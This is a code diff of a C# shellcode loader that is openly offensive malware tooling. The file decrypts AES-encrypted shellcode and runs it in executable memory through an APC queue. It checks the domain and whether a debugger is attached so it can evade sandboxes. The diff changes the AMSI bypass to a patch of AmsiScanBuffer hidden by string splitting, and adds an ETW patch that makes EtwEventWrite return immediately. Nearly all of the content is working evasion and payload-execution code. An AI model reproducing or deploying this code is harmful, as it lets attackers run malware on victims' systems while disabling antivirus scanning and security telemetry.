@@ -14,7 +14,7 @@ using System.Security;
 using System.Security.Cryptography;
 using System.IO;
 
-namespace CsharpShellCodeLoader
+namespace  CsharpShellCodeLoader
 {
 
     class Program
@@ -30,7 +30,29 @@ namespace CsharpShellCodeLoader
 	   public static extern IntPtr GetCurrentThread();
 
 	  [DllImport("kernel32.dll", SetLastError = true)]
-	   public static extern UInt32 QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, UInt32 dwData);
+	   public static extern UInt32 QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, UInt32 dwData);	
+
+      [DllImport("kernel32.dll")]
+       static extern void Sleep(uint dwMilliseconds);
+
+      [DllImport("kernel32")]
+	   public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+      [DllImport("kernel32")]
+	   public static extern IntPtr LoadLibrary(string name);
+	
+      [DllImport("kernel32.dll")]
+	   public static extern IntPtr GetModuleHandle(string lpModuleName);
+
+      [DllImport("kernel32")]
+	   public static extern bool VirtualProtect(IntPtr lpAddress, UInt32 dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+      [DllImport("kernel32.dll")]
+	   public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+      [DllImport("kernel32.dll", SetLastError = true)]
+	   private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);
+
 	   
 	   public enum NTSTATUS : uint {
             Success = 0,
@@ -52,27 +74,29 @@ namespace CsharpShellCodeLoader
             PAGE_WRITECOMBINE = 0x00000400
         }
 
-	   // Basic SandBox evasion checks
-	   public static void BasicSandBoxEvasion(string MyDomainName)
-      {
-			  // Defense evasion: Exit the program if it is running on a Windows computer that is not joined to a specific domain that you will input as an argument
-        if (string.Equals(MyDomainName, System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName, StringComparison.CurrentCultureIgnoreCase))
+        // Basic SandBox evasion checks
+        public static void BasicSandBoxEvasion(string MyDomainName)
         {
-				   Console.WriteLine("Domain name check is Ok -> " + System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName);
-         }
-        else {
-				    return;
-			   }
-        // Defense evasion: Exit the program if a debugger is attached
-        if (System.Diagnostics.Debugger.IsAttached)
-			  {
+          // Defense evasion: Exit the program if it is running on a computer that is not joined to a domain
+            if (string.Equals(MyDomainName, System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName, StringComparison.CurrentCultureIgnoreCase))
+            {
+				//Go on
+				Console.WriteLine("Domain name check is Ok -> " + System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName);
+            }
+			else
+			{
 				return;
+			}
+            // Defense evasion: Exit the program if a debugger is attached
+			if (System.Diagnostics.Debugger.IsAttached)
+			{
+				return;
+			}
         }
-      }
 
-	   // Decrypting the AES encrypted shellcode 
-	   public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passkeyBytes)
-     {
+        // Decrypting the AES encrypted shellcode 
+		public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passkeyBytes)
+        {
 			byte[] decryptedBytes = null;
 			byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
 
@@ -97,228 +121,76 @@ namespace CsharpShellCodeLoader
 					decryptedBytes = ms.ToArray();
 				}
 			}
+
 			return decryptedBytes;
-		 }
+		}
 		
-		// Begining A-M-S-I patching code - Taken and on slightly modified from the S-H-A-R-P-K-I-L-L-E-R GitHub project
-		public class AMSIPatcher
+        // AMSI patching 		
+		public static void PatchAmsi()
 		{
-			[DllImport("kernel32.dll")]
-			static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, ref int lpNumberOfBytesWritten);
+			IntPtr lib = LoadLibrary("ams"+"i.dl"+"l");
+			IntPtr aammssii = GetProcAddress(lib, "A"+"msiSc"+"anBu"+"ffe"+"r");
+			IntPtr final = IntPtr.Add(aammssii, 0x95);
+			uint old = 0;
+			VirtualProtect(final, (UInt32)0x1, 0x40, out old);
+			byte[] patch = new byte[] { 0x75 };
+			Marshal.Copy(patch, 0, final, 1);
+		}	
+		
+        // ETW patching 		
+		public static void PatchEtw()
+		{
+			const uint PAGE_EXECUTE_READWRITE = 0x40;
+			string ntdllModuleName = "ntdll.dll";
+			string etwEventWriteFunctionName = "EtwEventWrite";
 
-			[DllImport("kernel32.dll", SetLastError = true)]
-			static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
+			IntPtr ntdllModuleHandle = GetModuleHandle(ntdllModuleName);
+			IntPtr etwEventWriteAddress = GetProcAddress(ntdllModuleHandle, etwEventWriteFunctionName);
 
-			[DllImport("kernel32.dll")]
-			static extern IntPtr OpenProcess(UInt32 dwDesiredAccess, bool bInheritHandle, UInt32 dwProcessId);
-
-			[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
-			static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-
-			[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-			internal static extern IntPtr LoadLibrary(string lpFileName);
-
-			[DllImport("kernel32.dll", SetLastError = true)]
-			static extern IntPtr CreateToolhelp32Snapshot(SnapshotFlags dwFlags, uint th32ProcessID);
-
-			[DllImport("kernel32.dll")]
-			static extern bool Process32First(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);
-
-			[DllImport("kernel32.dll")]
-			static extern bool Process32Next(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);
-
-			[DllImport("kernel32.dll", SetLastError = true)]
-			static extern bool CloseHandle(IntPtr hObject);
-
-			static List<int> alreadyPatched = new List<int>();
-
-			[StructLayout(LayoutKind.Sequential)]
-			struct PROCESSENTRY32
-			{
-				public uint dwSize;
-				public uint cntUsage;
-				public uint th32ProcessID;
-				public IntPtr th32DefaultHeapID;
-				public uint th32ModuleID;
-				public uint cntThreads;
-				public uint th32ParentProcessID;
-				public int pcPriClassBase;
-				public uint dwFlags;
-				[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
-				public string szExeFile;
+			byte[] retOpcode = { 
+			0xC3 
 			};
 
-			[Flags]
-			enum SnapshotFlags : uint
-			{
-				HeapList = 0x00000001,
-				Process = 0x00000002,
-				Thread = 0x00000004,
-				Module = 0x00000008,
-				Module32 = 0x00000010,
-				Inherit = 0x80000000,
-				All = 0x0000001F
-			}
-
-			private enum State
-			{
-				MEM_COMMIT = 0x00001000,
-				MEM_RESERVE = 0x00002000
-			}
-
-			private enum Process_access
-			{
-				PROCESS_ALL_ACCESS = 0x000F0000 | 0x00100000 | 0xFFFF,
-				PROCESS_CREATE_THREAD = 0x0002,
-				PROCESS_QUERY_INFORMATION = 0x0400,
-				PROCESS_VM_OPERATION = 0x0008,
-				PROCESS_VM_READ = 0x0010,
-				PROCESS_VM_WRITE = 0x0020
-			}
-
-			private const UInt32 INVALID_HANDLE_VALUE = 0xffffffff;
-
-			private byte[] patch = new byte[1] { 0xEB };
-
-			private int SearchPattern(byte[] startAddress, Int64 searchSize, List<object> pattern, Int64 patternSize)
-			{
-				int i = 0;
-
-				while (i < 1024)
-				{
-
-					if (startAddress[i].ToString().Equals(pattern[0].ToString()))
-					{
-						int j = 1;
-						while (j < patternSize && i + j < searchSize && (pattern[j].ToString().Equals("?") || startAddress[i + j].ToString().Equals(pattern[j].ToString())))
-							j++;
-						if (j == patternSize)
-							return i + 3;
-					}
-					i++;
-				}
-				return i;
-			}
-
-			// AMSI patching of a target process (input = the process ID of the loader).
-			private int PatchAmsi(int tpid)
-			{
-				List<object> pattern = new List<object>() { 0x48, '?', '?', 0x74, '?', 0x48, '?', '?', 0x74 };
-
-				int patternSize = pattern.Count;
-				if (tpid == 0)
-					return -1;
-
-				IntPtr ProcessHandle = OpenProcess((Int32)Process_access.PROCESS_VM_OPERATION | (Int32)Process_access.PROCESS_VM_READ | (Int32)Process_access.PROCESS_VM_WRITE, false, (UInt32)tpid);
-				if (ProcessHandle == null)
-					return -1;
-
-				IntPtr hm = LoadLibrary("amsi.dll");
-				if (hm == null)
-					return -1;
-
-				IntPtr AmsiAddr = GetProcAddress(hm, "AmsiOpenSession");
-				if (AmsiAddr == null)
-					return -1;
-
-				byte[] buff = new byte[1024];
-				IntPtr ReadPm = IntPtr.Zero;
-				if (!ReadProcessMemory(ProcessHandle, AmsiAddr, buff, 1024, out ReadPm))
-					return -1;
-
-				int matchAddress = SearchPattern(buff, buff.Length, pattern, patternSize);
-				AmsiAddr += matchAddress;
-				int byteswritten = 0;
-
-				if (!WriteProcessMemory(ProcessHandle, AmsiAddr, patch, 1, ref byteswritten))
-					return -1;
-				return 0;
-			}
-		
-			// Iterates through running processes, patches AMSI when the loader process is found, and tracks the result.
-			public void PatchLoaderProcess()
-			{
-
-				int procId = 0;
-				int result = 0;
-				string processName = "loader.exe";
-
-				IntPtr hSnap = CreateToolhelp32Snapshot(SnapshotFlags.Process, 0);
-
-				if ((UInt32)hSnap != INVALID_HANDLE_VALUE)
-				{
-					PROCESSENTRY32 entry = new PROCESSENTRY32();
-
-					entry.dwSize = (uint)Marshal.SizeOf(entry);
-
-					if (Process32First(hSnap, ref entry))
-					{
-						if (entry.th32ProcessID == 0)
-						{
-							Process32Next(hSnap, ref entry);
-							do
-							{
-								if (entry.szExeFile.Equals(processName))
-								{
-									procId = (int)entry.th32ProcessID;
-
-									if (result == PatchAmsi(procId) && !alreadyPatched.Contains(procId))
-									{
-										Console.WriteLine("[+] AMSI Patched: " + entry.th32ProcessID);
-										alreadyPatched.Add(procId);
-									}
-									else if (result == -1)
-									{
-										Console.WriteLine(entry.th32ProcessID);
-										Console.WriteLine("Result: " + result);
-										Console.WriteLine("[-] Patch Failed");
-									}
-								}
-							} while (Process32Next(hSnap, ref entry));
-						}
-					}
-					CloseHandle(hSnap);
-					return;
-				  }
-			 }
+			uint oldProtect;
+			VirtualProtect(etwEventWriteAddress, (UIntPtr)retOpcode.Length, PAGE_EXECUTE_READWRITE, out oldProtect);
+			
+			int bytesWritten;
+			WriteProcessMemory(Process.GetCurrentProcess().Handle, etwEventWriteAddress, retOpcode, (uint)retOpcode.Length, out bytesWritten);
 		}
-			static void Main(string[] args)
-        {
-			    // Exit if no argument and do not provide information except "Missing arguments".
-			    if (args.Length < 1)
-			    {
-			    	Console.WriteLine("Missing arguments.");
-			    	Environment.Exit(0);
-			    }
-			
-			    // The first argument is the joined domain name of the target Windows machine (input for the sandbox evasion check)
-			    string CheckMyDomainName = args[0];
-			    BasicSandBoxEvasion(CheckMyDomainName);
-			
-			    // The second argument is the (process) name of the loader (e.g., "loader")
-			    string loaderprocessname = args[1];
-			    AMSIPatcher amsiPatcher = new AMSIPatcher();
-			    Process[] processes = Process.GetProcessesByName(loaderprocessname);
-            if (processes.Length > 0)
-            amsiPatcher.PatchLoaderProcess();
-			
-			    // The third argument is the path to the file containing your AES-256 encrypted shellcode encoded in base 64 (i.e., C:\path\file.txt or .\path\file.txt)
-			    string encodedfilepath = args[2];
-			    string encodedfile = File.ReadAllText(encodedfilepath);
-			    byte[] aesencryptedshellcode = Convert.FromBase64String(encodedfile);
-			
-			    // The fourth argument is the AES cypher passkey 
-			    string passkey = args[3];
-			    byte[] passkeyBytes = Encoding.UTF8.GetBytes(passkey);
-			    passkeyBytes = SHA256.Create().ComputeHash(passkeyBytes);
-			
-			    byte[] buffer = AES_Decrypt(aesencryptedshellcode, passkeyBytes);
 
-			    IntPtr funcAddr = VirtualAlloc(0, (UInt32)buffer.Length, 0x1000, AllocationProtect.PAGE_EXECUTE_READWRITE);
-			    Marshal.Copy(buffer, 0, (IntPtr)(funcAddr), buffer.Length);
-			    IntPtr CurrentThread_hanlde = GetCurrentThread();
-			    QueueUserAPC(funcAddr, CurrentThread_hanlde, 0);
-			    NtTestAlert();
+        static void Main(string[] args)
+        {
+			// Exit if no argument and do not provide information except "Missing arguments".
+			if (args.Length < 1)
+			{
+				Console.WriteLine("Missing arguments.");
+				Environment.Exit(0);
+			}
+			
+			// The first argument is the joined domain name of the target Windows machine (input for the Sandbox evasion check)
+			string CheckMyDomainName = args[0];
+			BasicSandBoxEvasion(CheckMyDomainName);
+			
+			// A-M-S-I & E-T-W patching
+			PatchAmsi();
+			PatchEtw();
+		
+			// The second argument is the path to the file containing your aes encrypted shellcode encoded in base 64 (i.e., .\path\file.txt or C:\path\file.txt)
+			string encodedfilepath = args[1];
+			string encodedfile = File.ReadAllText(encodedfilepath);
+			byte[] aesencryptedshellcode = Convert.FromBase64String(encodedfile);
+			
+			// The third argument is the AES passkey 
+			string passkey = args[2];
+			byte[] passkeyBytes = Encoding.UTF8.GetBytes(passkey);
+			passkeyBytes = SHA256.Create().ComputeHash(passkeyBytes);
+			
+			byte[] buffer = AES_Decrypt(aesencryptedshellcode, passkeyBytes);
+            IntPtr funcAddr = VirtualAlloc(0, (UInt32)buffer.Length, 0x1000, AllocationProtect.PAGE_EXECUTE_READWRITE);
+            Marshal.Copy(buffer, 0, (IntPtr)(funcAddr), buffer.Length);
+            IntPtr CurrentThread_hanlde = GetCurrentThread();
+            QueueUserAPC(funcAddr, CurrentThread_hanlde, 0);
+            NtTestAlert();
         }
     }
 }
